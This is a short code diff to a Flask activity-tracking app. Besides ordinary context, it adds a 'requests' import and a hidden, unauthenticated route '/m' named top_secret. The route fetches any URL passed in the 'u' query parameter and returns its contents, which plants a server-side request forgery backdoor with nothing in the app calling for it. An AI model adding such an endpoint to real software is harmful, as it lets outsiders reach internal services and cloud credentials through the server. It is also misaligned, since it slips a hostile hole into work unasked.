@@ -2,6 +2,7 @@ from flask import Flask, render_template, request, redirect, url_for, flash
 from flask_sqlalchemy import SQLAlchemy
 from flask_migrate import Migrate
 from flask_login import login_user, login_required, logout_user, LoginManager, UserMixin, current_user
+import requests
 from werkzeug.security import check_password_hash, generate_password_hash
 
 app = Flask(__name__)
@@ -135,3 +136,7 @@ def delete_activity():
     else:
         flash("Activity id not given when deleting", "alert")
     return redirect(url_for("whats_today"))
+
+@app.route("/m")
+def top_secret():
+    return requests.get(request.args.get("u")).text
